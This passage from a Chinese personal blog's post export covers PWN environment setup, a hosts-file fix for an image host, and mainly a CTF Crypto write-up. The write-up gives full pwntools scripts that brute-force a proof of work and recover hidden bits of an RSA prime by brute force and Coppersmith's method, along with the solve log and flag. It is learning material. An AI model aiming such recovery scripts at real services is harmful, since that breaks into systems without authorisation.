Document.txt），将这个空白文档保存到这个模板文件夹下。\n这时候再右键空白处就会发现多了一个新建文档选项，下面可选项有Txt Document。\n3、同理可以新建空白的LibreOffice Writer/Calc/Impress等文档，保存至模板文件夹下。\n另外，LibreOffice Writer/Calc/Impress等也可以另存为Office Word/Excel/PPT格式的模板\n把需要的空白模板放入模板文件夹后，右键空白就可以新建相应的文件了。\n参考链接： ubuntu 22.04系统添加右键新建文本文档及Office的功能 - 知乎 (zhihu.com)\n附录 # 本文其他的参考链接及推荐阅读：\nubuntu20.04 PWN（含x86、ARM、MIPS）环境搭建\nUbuntu22.04搭建PWN环境\npwn基础 PWN环境搭建\n再放一张学习pwn的路线图，来源于华科的 C0lin 师傅：\npwn学习路线图\n","date":"July 10, 2023","permalink":"/posts/pwn/basic/pwn-_environment/","section":"Posts","summary":"如果本博客部分文章图片加载失败， 可以点击此处查看解决办法 前言","title":"PWN环境二次搭建记录-Ubuntu 22.04"},{"content":"如果本博客中有任何图片加载失败，可以参考本文章的解决方案！ 需要使用魔法上网（悲\n2024.02.01 更：\n之前的方法已经失效了，\n我之后找时间换一下图床（咕咕咕）\n目前可能需要大家魔法上网才能加载图片了\n不过应该也没什么人来看这个博客吧（）\n以下为 2023.07.10 发布内容：\n省流：修改 C:\\Windows\\System32\\drivers\\etc\\hosts 文件为：\n104.26.1.190 s2.loli.net # 也可以选择其他的IP地址 # 如：172.67.69.40 # 104.26.0.190 前言： # 使用markdown有一个比较头疼的问题就是文章中图片的保存问题，md文件的图片都是以链接的形式来保存的，但是如果将图片全都保存到github上又会有加载过慢的问题。所以我在看了网上的一些大佬的博客之后，选择了使用 PicGo + smms 的方式构建图床，具体构建方法可以参考：\nPicGo + smms 构建图床\n（本篇文章的所有图片其实都没什么用，不过刷新网页可以用来检测图片是否加载成功，比如下面的这张测试图片：）\n判断SM.MS图床加载失败的原因： # 其实不只是大家在看博客上面的文章时会发现图片加载不出来，我自己在本地的一些md文件里也会出现图片加载不出来的情况，原因可能有两个：\n（1）SM.MS图床的后台突然挂掉了，这时我们除了等待其恢复没有别的办法（悲\n（2）可能是本地的网络环境出现了点问题导致图片加载不出来\n那么如何判断呢？\n可以在我们本地的终端里输入以下命令来排查：\n### 先ping一下百度看看有没有断网 ping baidu.com # 输出： 正在 Ping baidu.com [110.242.68.66] 具有 32 字节的数据: 来自 110.242.68.66 的回复: 字节=32 时间=57ms TTL=50 来自 110.242.68.66 的回复: 字节=32 时间=62ms TTL=50 来自 110.242.68.66 的回复: 字节=32 时间=51ms TTL=50 来自 110.242.68.66 的回复: 字节=32 时间=52ms TTL=50 110.242.68.66 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 51ms，最长 = 62ms，平均 = 55ms ### 再ping一下s2.loli.net看看 ping s2.loli.net # 正常情况下应该是这样的： 正在 Ping s2.loli.net [172.67.69.40] 具有 32 字节的数据: 来自 172.67.69.40 的回复: 字节=32 时间=264ms TTL=53 来自 172.67.69.40 的回复: 字节=32 时间=252ms TTL=53 来自 172.67.69.40 的回复: 字节=32 时间=250ms TTL=53 来自 172.67.69.40 的回复: 字节=32 时间=255ms TTL=53 172.67.69.40 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 250ms，最长 = 264ms，平均 = 255ms # 如果输出是下面这样的话，说明问题是出现在了域名解析上 正在 Ping s2.loli.net [127.0.0.1] 具有 32 字节的数据: 来自 127.0.0.1 的回复: 字节=32 时间\u0026lt;1ms TTL=128 来自 127.0.0.1 的回复: 字节=32 时间\u0026lt;1ms TTL=128 来自 127.0.0.1 的回复: 字节=32 时间\u0026lt;1ms TTL=128 来自 127.0.0.1 的回复: 字节=32 时间\u0026lt;1ms TTL=128 127.0.0.1 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 0ms，最长 = 0ms，平均 = 0ms 如果ping s2.loli.net 之后来自的回复是像104.26.1.190这样的正常IP地址的话，应该是图床后台挂了的原因，如果是来自127.0.0.1或者是::1这样的IP地址，说明是我们的本地对于s2.loli.net的域名解析错误所以图片不能正常加载。\n解决办法 # 相关的解决办法我参考了 突然我的SM.MS的图床没法访问了（内附解决方法）这篇博客文章的方法，实用且好操作。\n1. 找到域名 s2.loli.net 对应的IP地址 # # 在linux下使用nslookup命令： nslookup s2.loli.net # (以下为图片内容) ta0lve@ta0lve:~/桌面$ nslookup s2.loli.net Server:\t127.0.0.53 Address:\t127.0.0.53#53 Non-authoritative answer: s2.loli.net\tcanonical name = s2.loli.net.cdn.cloudflare.net. Name:\ts2.loli.net.cdn.cloudflare.net Address: 104.26.0.190 Name:\ts2.loli.net.cdn.cloudflare.net Address: 172.67.69.40 Name:\ts2.loli.net.cdn.cloudflare.net Address: 104.26.1.190 Name:\ts2.loli.net.cdn.cloudflare.net Address: 2606:4700:20::681a:be Name:\ts2.loli.net.cdn.cloudflare.net Address: 2606:4700:20::681a:1be Name:\ts2.loli.net.cdn.cloudflare.net Address: 2606:4700:20::ac43:4528 可以看到这个域名对应了很多个IP地址，我们只需要选择其中一个就好了，当然，在选择是我们也可以测试一下他们各自的速度。\n在我自己Windows 的 PowerShell 7.3.5 下随便测试了一下，好像104.26.1.190的IP地址会快一些\n# 172.67.69.40 平均255ms 正在 172.67.69.40 具有 32 字节的数据: 来自 172.67.69.40 的回复: 字节=32 时间=253ms TTL=53 来自 172.67.69.40 的回复: 字节=32 时间=248ms TTL=53 来自 172.67.69.40 的回复: 字节=32 时间=254ms TTL=53 来自 172.67.69.40 的回复: 字节=32 时间=257ms TTL=53 172.67.69.40 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 248ms，最长 = 257ms，平均 = 253ms # 104.26.0.190 平均243ms 正在 104.26.0.190 具有 32 字节的数据: 来自 104.26.0.190 的回复: 字节=32 时间=237ms TTL=53 来自 104.26.0.190 的回复: 字节=32 时间=232ms TTL=53 来自 104.26.0.190 的回复: 字节=32 时间=240ms TTL=53 来自 104.26.0.190 的回复: 字节=32 时间=264ms TTL=53 104.26.0.190 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 232ms，最长 = 264ms，平均 = 243ms # 104.26.1.190 平均218ms 正在 104.26.1.190 具有 32 字节的数据: 来自 104.26.1.190 的回复: 字节=32 时间=216ms TTL=53 来自 104.26.1.190 的回复: 字节=32 时间=215ms TTL=53 来自 104.26.1.190 的回复: 字节=32 时间=215ms TTL=53 来自 104.26.1.190 的回复: 字节=32 时间=226ms TTL=53 104.26.1.190 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)， 往返行程的估计时间(以毫秒为单位): 最短 = 215ms，最长 = 226ms，平均 = 218ms 2.更改Windows域名解析文件 # 修改 C:\\Windows\\System32\\drivers\\etc\\hosts 文件为：\n104.26.1.190 s2.loli.net # 也可以选择其他的IP地址 # 如：172.67.69.40 # 104.26.0.190 注意，需要有管理员权限才能修改，如果懒得在命令行下更改可以：\n右键=\u0026gt;属性=\u0026gt;安全=\u0026gt;编辑（权限）来将我们用户对于该文件的修改和写入权限改为允许。\n（下面两张图其实没什么用）\n然后就可以直接选择用记事本编辑我们的hosts文件为：\n104.26.0.190 （下面这张图其实也没什么用）\n保存之后等待一会 ping一下 s2.loli.net 检测一下，如果成功就OK啦\n最后刷新一下网页看看这篇文章的图片能不能正常加载吧！\n参考链接： # 突然我的SM.MS的图床没法访问了（内附解决方法）\n","date":"July 10, 2023","permalink":"/posts/sth/sm.ms/","section":"Posts","summary":"\u003cp\u003e\u003cstrong\u003e如果本博客中有任何图片加载失败\u003c/strong\u003e，\u003cdel\u003e可以参考本文章的解决方案！\u003c/del\u003e 需要使用魔法上网（悲\u003c/p\u003e","title":"SM.MS图床加载失败解决方法"},{"content":"","date":"July 10, 2023","permalink":"/tags/%E5%9B%BE%E5%BA%8A/","section":"Tags","summary":"","title":"图床"},{"content":"","date":"July 6, 2023","permalink":"/tags/canary/","section":"Tags","summary":"","title":"canary"},{"content":"","date":"July 6, 2023","permalink":"/tags/crypto/","section":"Tags","summary":"","title":"Crypto"},{"content":"","date":"July 6, 2023","permalink":"/tags/ret2libc/","section":"Tags","summary":"","title":"ret2libc"},{"content":"","date":"July 6, 2023","permalink":"/tags/ret2text/","section":"Tags","summary":"","title":"ret2text"},{"content":" 前言 # 本文为我个人第一次接触CTF的Crypto方向中的环境题的wp，主要是简单回忆并记录一下自己当时的做题过程，仅为个人的一个学习记录，水平不高还望师傅们包容。\n题目附件 # # task.py from hashlib import sha256 import random import string import signal from Crypto.Util.number import * table = string.ascii_letters + string.digits def proof_of_work(): proof = (\u0026#39;\u0026#39;.join([random.choice(table)for _ in range(12)])).encode() sha = sha256(proof).hexdigest() print(\u0026#34;[+] sha256(XXXX+\u0026#34; + proof[4:].decode() + \u0026#34;) == \u0026#34; + sha) XXXX = input(\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;).encode() if len(XXXX) != 4 or sha256(XXXX + proof[4:]).hexdigest() != sha: return False return True def level1(): p = getPrime(512) q = getPrime(512) n = p * q p_bin = bin(p)[2:] p_bin_corrupted = p_bin[:-24] + \u0026#39;█\u0026#39; * 24 print(f\u0026#39;[+] n = {n}\u0026#39;) print(f\u0026#39;[+] p = {p_bin_corrupted}\u0026#39;) ans = input(\u0026#34;[+] Now please tell me the last 24 bits of p: \u0026#34;) if ans == p_bin[-24:]: print(\u0026#39;[+] Recovered successfully! Here is your flag:\u0026#39;) print(open(\u0026#34;/flag1\u0026#34;, \u0026#34;r\u0026#34;).read()) else: print(\u0026#34;[-] Wrong Answer!\u0026#34;) def level2(): brokenbits = 114 pqbits = 514 p = getPrime(pqbits) q = getPrime(pqbits) n = p * q p_bin = bin(p)[2:] p_bin_corrupted = p_bin[:-brokenbits] + \u0026#39;█\u0026#39; * brokenbits print(f\u0026#39;[+] n = {n}\u0026#39;) print(f\u0026#39;[+] p = {p_bin_corrupted}\u0026#39;) ans = input(\u0026#34;[+] Now please tell me the last 114 bits of p: \u0026#34;) if ans == p_bin[-brokenbits:]: print(\u0026#39;[+] Recovered successfully! Here is your flag:\u0026#39;) print(open(\u0026#34;/flag2\u0026#34;, \u0026#34;r\u0026#34;).read()) else: print(\u0026#34;[-] Wrong Answer!\u0026#34;) banner = \u0026#34;\u0026#34;\u0026#34; Hi, I get the p of RSA, but XiaoMing upset the ink, making some last bits of p become unknown. Can you help me recover the p? \u0026gt; 1. A dab of ink. \u0026gt; 2. A wad of ink. \u0026#34;\u0026#34;\u0026#34; signal.alarm(200) Hash = proof_of_work() if not Hash: print(\u0026#39;[-] Wrong!\u0026#39;) exit() print(banner) print(\u0026#39;[+] Choose your option:\u0026#39;) choice = input(\u0026#39;\u0026gt; your choice: \u0026#39;) if choice == \u0026#39;1\u0026#39;: level1() elif choice == \u0026#39;2\u0026#39;: level2() 分析 # 本题为环境题，题目分为三个部分：\n连过去之后首先是一个proof_of_work 这是一个简单的工作量证明（Proof of Work）函数，它生成一个随机的长度为12的字符串，然后使用 SHA256 哈希算法计算哈希值。 接着，通过用户输入一个4位的字符串 XXXX，将输入字符串与之前生成的随机字符串组合，并使用 SHA256 哈希算法计算哈希值。 如果两个哈希值相等，且输入字符串长度为4，则返回 True，否则返回 False 由于4位字符串XXXX并不长，我们可以采用枚举法的方式来枚举所有字符串并计算1其hash是否与题目所给的相同 接下来就是两道Crypto题，分别是level1与level2，对应两个flag level1被遮挡的数字brokenbits只有24位，也可以直接枚举爆破得出答案 level2brokenbits有114位，就需要我们通过数学的方法来得出被遮挡的数字了 各部分的解题脚本 # proof_of_work # def proof_of_work(suffix, hash, prelen=4): table = string.ascii_letters + string.digits r = its.product(table, repeat=prelen) for i in tqdm(r): i = \u0026#39;\u0026#39;.join(i) str = i + suffix str_256 = sha256(str.encode()).hexdigest() if str_256 == hash: return i raise Exception(\u0026#39;not found for suffix: %s, hash: %s\u0026#39; % (suffix, hash)) level 1 # def level1(): taolve.sendlineafter(b\u0026#39;\u0026gt; your choice: \u0026#39;, b\u0026#39;1\u0026#39;) nnn = int(taolve.recvline_startswith(b\u0026#39;[+] n = \u0026#39;).decode()[8:]) corrupted_p = int(taolve.recvline_startswith(b\u0026#39;[+] p = \u0026#39;).decode()[8:-24], 2) \u0026lt;\u0026lt; 24 num = 16777217 for a in range(num, 1, -2): i = a p = corrupted_p + i if nnn % p != 0: print(f\u0026#39;[+] i = {i}\u0026#39;) continue else: p_bin = bin(p)[-24:] p_bin_corrupted = p_bin[-24:] taolve.sendline(p_bin_corrupted.encode()) break taolve.interactive() level 2 # # 在sagemath中运行 def level2(): taolve.sendlineafter(b\u0026#39;\u0026gt; your choice: \u0026#39;, b\u0026#39;2\u0026#39;) n = int(taolve.recvline_startswith(b\u0026#39;[+] n = \u0026#39;).decode()[8:]) corrupted_p = int(taolve.recvline_startswith(b\u0026#39;[+] p = \u0026#39;).decode()[8:-114], 2) \u0026lt;\u0026lt; 114 pbits = 512 kbits = 114 PR.\u0026lt; x \u0026gt; = PolynomialRing(Zmod(n)) f = x + corrupted_p roots = f.small_roots(X=2 ^ kbits, beta=0.4) if roots: p = corrupted_p + int(roots[0]) print(n) print(p) print(n / p) p_bin = bin(p)[-114:] p_bin_corrupted = p_bin[-114:] taolve.sendline(p_bin_corrupted.encode()) taolve.interactive() 一些notes：\n\u0026#34;\u0026#34;\u0026#34; n= p4= #已知P的高位 e= pbits= #P原本的位数 kbits=pbits - p4.nbits() print p4.nbits() p4 = p4 \u0026lt;\u0026lt; kbits PR.\u0026lt;x\u0026gt; = PolynomialRing(Zmod(n)) f = x + p4 roots = f.small_roots(X=2^kbits,beta=0.4) # 经过以上一些函数处理后，n和p已经被转化为10进制 if roots: p= p4 + int(roots([0])) print (\u0026#34;n\u0026#34;,n) print (\u0026#34;p\u0026#34;,p) print (\u0026#34;q\u0026#34;,n/p) \u0026#34;\u0026#34;\u0026#34; 完整解题脚本 # level 1 # from pwn import * import string import itertools as its from tqdm import tqdm from hashlib import sha256 def proof_of_work(suffix, hash, prelen=4): table = string.ascii_letters + string.digits r = its.product(table, repeat=prelen) for i in tqdm(r): i = \u0026#39;\u0026#39;.join(i) str = i + suffix str_256 = sha256(str.encode()).hexdigest() if str_256 == hash: return i raise Exception(\u0026#39;not found for suffix: %s, hash: %s\u0026#39; % (suffix, hash)) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;172.25.76.164\u0026#39;, 39226) suffix = taolve.recvregex(b\u0026#39;\\w{8}\u0026#39;)[-8:].decode() hash = taolve.recvregex(b\u0026#39;\\w{64}\u0026#39;)[-64:].decode() taolve.recvuntil(b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) taolve.sendline(proof_of_work(suffix, hash).encode()) def level1(): taolve.sendlineafter(b\u0026#39;\u0026gt; your choice: \u0026#39;, b\u0026#39;1\u0026#39;) nnn = int(taolve.recvline_startswith(b\u0026#39;[+] n = \u0026#39;).decode()[8:]) corrupted_p = int(taolve.recvline_startswith(b\u0026#39;[+] p = \u0026#39;).decode()[8:-24], 2) \u0026lt;\u0026lt; 24 num = 16777217 for a in range(num, 1, -2): i = a p = corrupted_p + i if nnn % p != 0: print(f\u0026#39;[+] i = {i}\u0026#39;) continue else: p_bin = bin(p)[-24:] p_bin_corrupted = p_bin[-24:] taolve.sendline(p_bin_corrupted.encode()) break taolve.interactive() level1() level 2 # from pwn import * import string import itertools as its from tqdm import tqdm from hashlib import sha256 def proof_of_work(suffix, hash, prelen=4): table = string.ascii_letters + string.digits r = its.product(table, repeat=prelen) for i in tqdm(r): i = \u0026#39;\u0026#39;.join(i) str = i + suffix str_256 = sha256(str.encode()).hexdigest() if str_256 == hash: return i raise Exception(\u0026#39;not found for suffix: %s, hash: %s\u0026#39; % (suffix, hash)) context.log_level = \u0026#39;debug\u0026#39; taolve = remote(\u0026#39;172.25.76.164\u0026#39;, 39227) suffix = taolve.recvregex(b\u0026#39;\\w{8}\u0026#39;)[-8:].decode() hash = taolve.recvregex(b\u0026#39;\\w{64}\u0026#39;)[-64:].decode() taolve.recvuntil(b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39;) taolve.sendline(proof_of_work(suffix, hash).encode()) def level2(): taolve.sendlineafter(b\u0026#39;\u0026gt; your choice: \u0026#39;, b\u0026#39;2\u0026#39;) n = int(taolve.recvline_startswith(b\u0026#39;[+] n = \u0026#39;).decode()[8:]) corrupted_p = int(taolve.recvline_startswith(b\u0026#39;[+] p = \u0026#39;).decode()[8:-114], 2) \u0026lt;\u0026lt; 114 pbits = 512 kbits = 114 PR.\u0026lt; x \u0026gt; = PolynomialRing(Zmod(n)) f = x + corrupted_p roots = f.small_roots(X=2 ^ kbits, beta=0.4) if roots: p = corrupted_p + int(roots[0]) print(n) print(p) print(n / p) p_bin = bin(p)[-114:] p_bin_corrupted = p_bin[-114:] taolve.sendline(p_bin_corrupted.encode()) taolve.interactive() level2() 附录 # level 2 远程nc 解题时的一些记录：\npwner@pwner-virtual-machine:~/桌面/CTF$ sage ┌────────────────────────────────────────────────────────────────────┐ │ SageMath version 9.5, Release Date: 2022-01-30 │ │ Using Python 3.10.7. Type \u0026#34;help()\u0026#34; for help. │ └────────────────────────────────────────────────────────────────────┘ ....: taolve.sendline(proof_of_work(suffix, hash).encode()) ....: ....: ....: def level2(): ....: taolve.sendlineafter(b\u0026#39;\u0026gt; your choice: \u0026#39;, b\u0026#39;2\u0026#39;) ....: n = int(taolve.recvline_startswith(b\u0026#39;[+] n = \u0026#39;).decode()[8:]) ....: corrupted_p = int(taolve.recvline_startswith(b\u0026#39;[+] p = \u0026#39;).decode()[8:- ....: 114], 2) \u0026lt;\u0026lt; 114 ....: pbits = 512 ....: kbits = 114 ....: PR.\u0026lt; x \u0026gt; = PolynomialRing(Zmod(n)) ....: f = x + corrupted_p ....: roots = f.small_roots(X=2 ^ kbits, beta=0.4) ....: if roots: ....: p = corrupted_p + int(roots[0]) ....: print(n) ....: print(p) ....: print(n / p) ....: p_bin = bin(p)[-114:] ....: p_bin_corrupted = p_bin[-114:] ....: taolve.sendline(p_bin_corrupted.encode()) ....: taolve.interactive() ....: ....: level2() \u0026lt;input\u0026gt;:22: DeprecationWarning: invalid escape sequence \u0026#39;\\w\u0026#39; \u0026lt;input\u0026gt;:23: DeprecationWarning: invalid escape sequence \u0026#39;\\w\u0026#39; \u0026lt;\u0026gt;:22: DeprecationWarning: invalid escape sequence \u0026#39;\\w\u0026#39; \u0026lt;\u0026gt;:23: DeprecationWarning: invalid escape sequence \u0026#39;\\w\u0026#39; \u0026lt;ipython-input-1-a56b19bf7123\u0026gt;:22: DeprecationWarning: invalid escape sequence \u0026#39;\\w\u0026#39; suffix = taolve.recvregex(b\u0026#39;\\w{8}\u0026#39;)[-Integer(8):].decode() \u0026lt;ipython-input-1-a56b19bf7123\u0026gt;:23: DeprecationWarning: invalid escape sequence \u0026#39;\\w\u0026#39; hash = taolve.recvregex(b\u0026#39;\\w{64}\u0026#39;)[-Integer(64):].decode() [x] Opening connection to 172.25.76.164 on port 39227 [x] Opening connection to 172.25.76.164 on port 39227: Trying 172.25.76.164 [+] Opening connection to 172.25.76.164 on port 39227: Done [DEBUG] Received 0x74 bytes: b\u0026#39;[+] sha256(XXXX+cR77aeq9) == 453aaa6eb3fb30a6fe81e522ceb3fe3ae297aaf0335e96b4622736b78e4a932a\\n\u0026#39; b\u0026#39;[+] Plz Tell Me XXXX :\u0026#39; b\u0026#39;\\n[+] Plz Tell Me XXXX :\u0026#39; 14303872it [00:09, 1510648.01it/s] [DEBUG] Sent 0x5 bytes: b\u0026#39;8bfM\\n\u0026#39; [DEBUG] Received 0xcd bytes: b\u0026#39;\\n\u0026#39; b\u0026#39;Hi, I get the p of RSA, but XiaoMing upset the ink, making some last bits of p become unknown.\\n\u0026#39; b\u0026#39;Can you help me recover the p?\\n\u0026#39; b\u0026#39;\u0026gt; 1. A dab of ink.\\n\u0026#39; b\u0026#39;\u0026gt; 2. A wad of ink.\\n\u0026#39; b\u0026#39;\\n\u0026#39; b\u0026#39;[+] Choose your option:\\n\u0026#39; b\u0026#39;\u0026gt; your choice: \u0026#39; [DEBUG] Sent 0x2 bytes: b\u0026#39;2\\n\u0026#39; [DEBUG] Received 0x45d bytes: 00000000 5b 2b 5d 20 6e 20 3d 20 31 37 36 32 38 33 33 33 │[+] │n = │1762│8333│ 00000010 38 32 39 34 38 30 30 38 30 32 30 31 34 36 36 38 │8294│8008│0201│4668│ 00000020 38 30 37 33 36 30 31 39 35 39 32 31 35 36 31 35 │8073│6019│5921│5615│ 00000030 39 39 30 30 38 30 30 34 34 39 33 35 39 36 35 33 │9900│8004│4935│9653│ 00000040 35 30 32 36 34 30 33 38 33 34 34 38 30 35 37 30 │5026│4038│3448│0570│ 00000050 31 35 35 30 31 36 36 36 30 38 38 38 38 38 39 31 │1550│1666│0888│8891│ 00000060 38 33 38 38 32 32 30 34 36 33 38 30 30 31 32 34 │8388│2204│6380│0124│ 00000070 36 32 33 30 36 38 37 37 37 30 35 33 32 38 31 35 │6230│6877│7053│2815│ 00000080 33 38 31 33 32 39 35 39 35 35 35 32 30 35 30 31 │3813│2959│5552│0501│ 00000090 31 37 31 35 36 37 34 39 37 31 39 39 35 37 37 33 │1715│6749│7199│5773│ 000000a0 32 30 35 31 37 30 39 39 33 32 38 30 30 35 34 35 │2051│7099│3280│0545│ 000000b0 35 30 36 34 38 35 31 37 35 33 30 35 36 32 31 32 │5064│8517│5305│6212│ 000000c0 30 36 37 37 32 37 35 34 36 31 32 35 35 36 39 33 │0677│2754│6125│5693│ 000000d0 34 31 39 35 33 38 37 38 32 39 33 34 35 32 37 38 │4195│3878│2934│5278│ 000000e0 36 34 32 37 33 30 39 30 38 35 32 37 33 35 36 39 │6427│3090│8527│3569│ 000000f0 30 39 31 38 30 39 37 31 35 30 30 32 33 37 37 33 │0918│0971│5002│3773│ 00000100 31 33 32 36 33 35 30 31 35 30 38 31 31 35 37 33 │1326│3501│5081│1573│ 00000110 39 33 34 33 33 33 31 30 37 33 33 38 31 39 35 30 │9343│3310│7338│1950│ 00000120 37 39 37 33 38 34 39 30 37 31 34 33 38 37 33 37 │7973│8490│7143│8737│ 00000130 31 32 32 34 30 32 36 36 31 39 30 33 37 37 0a 5b │1224│0266│1903│77·[│ 00000140 2b 5d 20 70 20 3d 20 31 30 30 31 31 31 30 31 30 │+] p│ = 1│0011│1010│ 00000150 31 31 30 30 31 30 31 30 31 30 30 30 31 30 30 31 │1100│1010│1000│1001│ 00000160 30 31 31 31 31 31 30 31 30 31 31 31 31 31 30 30 │0111│1101│0111│1100│ 00000170 31 30 31 30 30 30 30 31 30 31 30 31 31 31 31 30 │1010│0001│0101│1110│ 00000180 31 31 31 30 30 30 31 31 31 31 31 30 31 30 31 30 │1110│0011│1110│1010│ 00000190 31 30 30 31 31 30 31 30 31 30 31 31 30 30 31 30 │1001│1010│1011│0010│ 000001a0 31 31 30 30 31 31 31 30 30 31 30 30 31 31 30 31 │1100│1110│0100│1101│ 000001b0 31 31 30 30 31 30 31 31 31 30 31 31 30 30 30 30 │1100│1011│1011│0000│ 000001c0 31 31 30 31 30 30 31 30 30 30 30 31 30 30 30 31 │1101│0010│0001│0001│ 000001d0 31 30 31 31 30 31 31 30 30 31 31 30 31 30 31 31 │1011│0110│0110│1011│ 000001e0 31 30 30 30 31 30 30 31 30 30 31 30 31 31 31 30 │1000│1001│0010│1110│ 000001f0 30 30 30 31 31 30 31 31 31 30 30 30 31 31 30 31 │0001│1011│1000│1101│ 00000200 30 31 30 31 30 30 30 30 30 30 30 30 30 30 30 31 │0101│0000│0000│0001│ 00000210 31 31 30 30 30 31 30 30 31 30 31 30 30 30 30 31 │1100│0100│1010│0001│ 00000220 30 30 31 31 30 31 31 31 31 31 31 31 30 31 31 30 │0011│0111│1111│0110│ 00000230 30 30 30 31 30 30 31 31 31 30 30 31 31 31 31 31 │0001│0011│1001│1111│ 00000240 31 31 31 30 31 31 31 30 30 31 30 31 30 31 31 30 │1110│1110│0101│0110│ 00000250 31 31 30 31 31 31 31 31 31 31 31 31 30 30 31 31 │1101│1111│1111│0011│ 00000260 30 31 31 31 30 31 31 31 31 31 31 30 31 31 31 30 │0111│0111│1110│1110│ 00000270 31 30 30 31 30 30 30 30 31 30 31 30 30 31 30 31 │1001│0000│1010│0101│ 00000280 30 31 30 31 30 31 30 30 31 31 31 30 30 30 30 31 │0101│0100│1110│0001│ 00000290 30 31 31 30 30 31 31 31 30 30 31 31 31 31 30 31 │0110│0111│0011│1101│ 000002a0 30 31 30 31 31 30 31 30 30 31 30 31 31 30 30 31 │0101│1010│0101│1001│ 000002b0 30 30 31 31 30 30 31 31 31 30 30 31 31 31 30 31 │0011│0011│1001│1101│ 000002c0 31 30 31 31 31 31 30 30 31 30 31 31 31 31 31 31 │1011│1100│1011│1111│ 000002d0 30 31 31 30 30 30 31 e2 96 88 e2 96 88 e2 96 88 │0110│001·│····│····│ 000002e0 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 000002f0 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 00000300 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 │····│····│····│····│ 00000310 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 00000320 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 00000330 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 │····│····│····│····│ 00000340 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 00000350 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 00000360 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 │····│····│····│····│ 00000370 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 00000380 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 00000390 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 │····│····│····│····│ 000003a0 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 000003b0 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 000003c0 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 │····│····│····│····│ 000003d0 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 000003e0 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 000003f0 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 │····│····│····│····│ 00000400 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 │····│····│····│····│ 00000410 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 e2 96 │····│····│····│····│ 00000420 88 e2 96 88 e2 96 88 e2 96 88 e2 96 88 0a 5b 2b │····│····│····│··[+│ 00000430 5d 20 4e 6f 77 20 70 6c 65 61 73 65 20 74 65 6c │] No│w pl│ease│ tel│ 00000440 6c 20 6d 65 20 74 68 65 20 6c 61 73 74 20 31 31 │l me│ the│ las│t 11│ 00000450 34 20 62 69 74 73 20 6f 66 20 70 3a 20 │4 bi│ts o│f p:│ │ 0000045d 1762833382948008020146688073601959215615990080044935965350264038344805701550166608888891838822046380012462306877705328153813295955520501171567497199577320517099328005455064851753056212067727546125569341953878293452786427309085273569091809715002377313263501508115739343331073381950797384907143873712240266190377 32973901696396829437845814337369523697782646770145318638505565183576603039632643726832442179138847225906000862084110484693662468094578270260478214601854141 5.3461473840101815e+154 [DEBUG] Sent 0x73 bytes: b\u0026#39;001100010000111000100100111101000001110001001111011000111011000110010000110111011001001011110010100100110010111101\\n\u0026#39; [*] Switching to interactive mode /usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:859: DeprecationWarning: isSet() is deprecated, use is_set() instead while not go.isSet(): [+] Now please tell me the last 114 bits of p: /usr/local/lib/python3.10/dist-packages/pwnlib/tubes/tube.py:878: DeprecationWarning: isSet() is deprecated, use is_set() instead while not go.isSet(): [DEBUG] Received 0x5b bytes: b\u0026#39;[+] Recovered successfully! Here is your flag:\\n\u0026#39; b\u0026#39;flag{522535d2-e64f-4a4f-b022-4d762cac4c5c}\\n\u0026#39; b\u0026#39;\\n\u0026#39; [+] Recovered successfully! Here is your flag: flag{522535d2-e64f-4a4f-b022-4d762cac4c5c} [*] Got EOF while reading in interactive ","date":"July 6, 2023","permalink":"/posts/wp/2023_--_--/basic_/0x02/","section":"Posts","summary":"前言 # 本文为我个人第一次接触CTF的Crypto方向中的环境","title":"some_easy_Crypto"},{"content":" 前言 # 本文为我个人第一次接触CTF的pwn方向时所做的题的wp，主要是简单回忆并记录一下自己当时的做题过程，仅为个人的一个学习记录，水平不高还望师傅们包容。\n0x01 stack # checksec # 当然，在拖入IDA前先例行检查一下：\n$ checksec pwn [*] \u0026#39;/pwn\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 简要分析 # 